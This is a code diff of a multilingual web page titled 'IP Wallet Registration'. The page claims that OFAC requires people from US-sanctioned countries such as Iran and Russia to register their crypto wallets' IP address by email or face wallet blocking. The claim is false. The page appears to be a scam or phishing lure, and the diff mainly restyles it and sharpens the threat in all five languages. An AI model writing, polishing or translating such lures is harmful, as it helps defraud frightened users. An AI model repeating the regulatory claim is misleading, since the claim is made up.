@@ -36,23 +36,23 @@
     .container {
       max-width: 420px;
       margin: 90px auto 40px;
-      background: rgba(255, 255, 255, 0.9);
+      background: rgba(255, 255, 255, 0.78); /* شفاف‌تر برای دیده شدن بک‌گراند */
       border-radius: 16px;
       padding: 24px;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
-      backdrop-filter: blur(3px);
+      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.35);
+      backdrop-filter: blur(2px);
     }
 
     h1 {
       text-align: center;
       margin-bottom: 14px;
-      color: #333;
+      color: #222;
     }
 
     p {
       font-size: 14px;
       text-align: center;
-      color: #333;
+      color: #222;
     }
 
     ul {
@@ -65,7 +65,6 @@
       margin-bottom: 6px;
     }
 
-    /* EMAIL BUTTONS */
     .email-actions {
       display: flex;
       gap: 12px;
@@ -92,7 +91,7 @@
     .note {
       text-align: center;
       font-size: 1rem;
-      opacity: 0.85;
+      opacity: 0.9;
       margin-bottom: 25px;
     }
 
@@ -105,7 +104,7 @@
       display: flex;
       flex-wrap: wrap;
       justify-content: center;
-      gap: 24px;
+      gap: 18px;
     }
 
     .wallets span {
@@ -113,12 +112,6 @@
       border-radius: 10px;
       padding: 8px 16px;
       cursor: default;
-      transition: background-color 0.3s;
-    }
-
-    .wallets span:hover {
-      background-color: #0d6efd;
-      color: #fff;
     }
 
     footer {
@@ -144,7 +137,7 @@
   <h1 id="title">IP Wallet Registration</h1>
 
   <p id="desc">
-    According to OFAC regulations, users from sanctioned countries must register their wallet IP address.
+    People from countries sanctioned by the United States of America must register the IP address of their hot wallets and cryptocurrency wallets via email; otherwise, they will be subject to OFAC sanctions.
   </p>
 
   <ul>
@@ -157,14 +150,13 @@
     <li>Russia (restricted entities)</li>
   </ul>
 
-  <!-- EMAIL BUTTONS -->
   <div class="email-actions">
     <button onclick="sendEmail()">ارسال ایمیل</button>
     <button onclick="copyEmail()">کپی ایمیل آدرس</button>
   </div>
 
   <p class="note" id="note">
-    A real person should send a message from their personal email address to the provided email, stating the name of their country and requesting to prevent the blockage of their wallet.
+    A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email.
   </p>
 
   <div class="wallets">
@@ -173,14 +165,9 @@
     <span>SafePal</span>
     <span>Coinbase</span>
     <span>Exodus</span>
-    <span>Argent</span>
     <span>Ledger</span>
-    <span>Mycelium</span>
     <span>Electrum</span>
-    <span>Bitcoin Core</span>
     <span>Blockchain Wallet</span>
-    <span>Jaxx Liberty</span>
-    <span>Armory</span>
     <span>Guarda</span>
     <span>BRD</span>
   </div>
@@ -207,28 +194,28 @@ function setLang(lang) {
   const t = {
     fa: {
       title: "ثبت IP کیف پول",
-      desc: "طبق قوانین OFAC کاربران کشورهای تحریم‌شده باید IP کیف پول خود را ثبت کنند.",
+      desc: "مردم کشور های تحریم شده توسط ایالات متحده آمریکا باید آدرس IP کیف پول‌های گرم و کیف پول‌های ارز دیجیتال خود را از طریق ایمیل ثبت کنند، در غیر این صورت شامل تحریم‌های OFAC خواهند بود.",
       note: "شخص حقیقی با ایمیل شخصی خود به ادرس ایمیل درج شده در صفحه پیام دهد و نام کشور خود را ارسال کند و از طریق ایمیل از مسدودی کیف پول خود جلوگیری کند!"
     },
     en: {
       title: "IP Wallet Registration",
-      desc: "According to OFAC regulations, users from sanctioned countries must register their wallet IP address.",
-      note: "A real person should send a message from their personal email address to the provided email, stating the name of their country and requesting to prevent the blockage of their wallet."
+      desc: "People from countries sanctioned by the United States of America must register the IP address of their hot wallets and cryptocurrency wallets via email; otherwise, they will be subject to OFAC sanctions.",
+      note: "A real person should send a message from their personal email address to the email address provided on the page, include the name of their country, and prevent the blockage of their wallet via email."
     },
     ru: {
       title: "Регистрация IP кошелька",
-      desc: "Согласно правилам OFAC, пользователи из санкционных стран должны зарегистрировать IP кошелька.",
-      note: "Физическое лицо должно отправить сообщение со своего личного электронного адреса на указанный email, указав название своей страны и предотвратив блокировку своего кошелька."
+      desc: "Граждане стран, находящихся под санкциями США, обязаны зарегистрировать IP-адреса своих горячих и криптовалютных кошельков по электронной почте, в противном случае они подпадут под санкции OFAC.",
+      note: "Физическое лицо должно отправить сообщение со своего личного электронного адреса на указанный email, указав название своей страны, чтобы предотвратить блокировку кошелька."
     },
     de: {
       title: "IP Wallet-Registrierung",
-      desc: "Laut OFAC-Vorschriften müssen Benutzer aus sanktionierten Ländern ihre Wallet-IP-Adresse registrieren.",
-      note: "Eine natürliche Person muss von ihrer persönlichen E-Mail-Adresse eine Nachricht an die auf der Seite angegebene E-Mail senden, den Namen ihres Landes angeben und die Sperrung ihrer Wallet per E-Mail verhindern."
+      desc: "Personen aus von den Vereinigten Staaten sanktionierten Ländern müssen die IP-Adresse ihrer Hot- und Krypto-Wallets per E-Mail registrieren, andernfalls unterliegen sie den OFAC-Sanktionen.",
+      note: "Eine natürliche Person muss von ihrer persönlichen E-Mail-Adresse eine Nachricht an die auf der Seite angegebene E-Mail senden, den Namen ihres Landes angeben und die Sperrung der Wallet verhindern."
     },
     zh: {
       title: "IP 钱包注册",
-      desc: "根据 OFAC 规定，来自受制裁国家的用户必须注册其钱包 IP 地址。",
-      note: "个人应使用其个人电子邮件地址向页面中提供的电子邮件发送消息，说明其国家名称，并通过电子邮件防止其钱包被封锁。"
+      desc: "来自受美国制裁国家的个人必须通过电子邮件注册其热钱包和加密货币钱包的 IP 地址，否则将受到 OFAC 制裁。",
+      note: "个人应使用其个人电子邮件地址向页面中提供的电子邮件发送信息，说明其国家名称，并通过电子邮件防止钱包被封锁。"
     }
   };
 
